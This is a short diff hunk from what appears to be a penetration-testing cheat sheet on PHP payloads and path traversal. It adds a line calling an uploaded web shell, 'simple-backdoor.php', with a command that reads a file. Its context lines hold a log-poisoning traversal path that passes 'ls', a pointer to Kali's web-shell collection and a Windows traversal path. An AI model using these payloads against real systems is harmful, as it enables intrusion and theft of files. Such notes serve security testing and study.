@@ -9,6 +9,8 @@ PHP Payload
 ../../../logs.log&cmd=ls
 # will pass the cmd command to poisoned log.
 /usr/share/webshells/ have a lot of payloads on kali
+simple-backdoor.php?cmd=cat%20/opt/install.txt
+# above file uploaded function over http call
 
 Path traversal on Windows OS
 /../../../../../../../../users/install.txt
